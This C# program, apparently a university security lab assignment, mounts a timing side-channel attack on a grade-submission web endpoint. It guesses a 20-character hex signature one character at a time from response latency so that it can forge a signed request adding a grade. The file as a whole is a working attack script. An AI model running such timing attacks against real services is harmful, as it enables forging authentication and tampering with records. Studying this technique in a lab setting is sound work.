using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Net.Http;
using System.Text;
using System.Threading.Tasks;

namespace UnsecureSite2
{
    class Program
    {
        private static char[] possibleValues = { '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'a', 'b', 'c', 'd', 'e', 'f' };
        private static string name;
        private static string grade;

        private static int nbrOfIterations = 10;
        private static int tolerance = 400;
        private static int startIndex;

        private static HttpClient httpClient;

        static void Main(string[] args)
        {
            Console.WriteLine("Welcome to the hacking of the grades website"); // Anna - 3
            name = "Anna"; /* Console.ReadLine(); */
            grade = "3"; /* Console.ReadLine(); */

            Console.WriteLine("Want to give the signature a headstart (leave empty if not): ");
            var sigStart = Console.ReadLine();
            startIndex = sigStart.Length;
            var signature = new StringBuilder(sigStart);
            for (var i = signature.Length; i < 20; i++)
                signature.Append("0");

            httpClient = new HttpClient {Timeout = new TimeSpan(0, 0, 0, 5)};
            var lastAverageTime = 0.0;

            for (var i = startIndex; i < 20; i++)
            {
                var averageTimeForPosition = new List<double>();
                for (var j = 0; j < nbrOfIterations; j++)
                {
                    for (var k = 0; k < possibleValues.Length; k++)
                    {
                        signature[i] = possibleValues[k];
                        var timeForCall = makeTimedCall(signature, lastAverageTime);
                        if (averageTimeForPosition.Count - 1 >= k && timeForCall - averageTimeForPosition[k] < tolerance)
                            averageTimeForPosition[k] = (averageTimeForPosition[k] + timeForCall) / 2;
                        else if (averageTimeForPosition.Count < k)
                        {
                            averageTimeForPosition.Add(timeForCall);
                        }
                    }
                }

                var avgTimeForCorrect = averageTimeForPosition.Max();
                signature[i] = possibleValues[averageTimeForPosition.IndexOf(avgTimeForCorrect)];
                lastAverageTime = avgTimeForCorrect;
            }

            Console.WriteLine("Signature found: {0}", signature);
            Console.WriteLine("Signature accepted: {0}", makeCall(signature) == "\n1");

        }

        private static double makeTimedCall(StringBuilder signature, double lastAverageTime)
        {
                var startTime = DateTime.Now;
                var response =
                    httpClient.GetAsync(
                        $"https://eitn41.eit.lth.se:3119/ha4/addgrade.php?name={name}&grade={grade}&signature={signature}");
                var result = response.Result;
            
                var endTime = DateTime.Now;
                var time = endTime.Subtract(startTime).TotalMilliseconds;
                Console.WriteLine("Making a call for signature {0}, change from last found char {1}", signature, time-lastAverageTime);
                return time;
        }

        private static string makeCall(StringBuilder signature)
        {
            var url =
                  $"https://eitn41.eit.lth.se:3119/ha4/addgrade.php?name={name}&grade={grade}&signature={signature}";
            var startTime = DateTime.Now;
            var request = WebRequest.CreateHttp(url);

            //request.Accept = "application/xrds+xml";  
            var response = (HttpWebResponse)request.GetResponse();
            var endTime = DateTime.Now;

            using (var reader = new System.IO.StreamReader(response.GetResponseStream(), Encoding.ASCII))
            {
                return reader.ReadToEnd();
            }
        }

    }
}
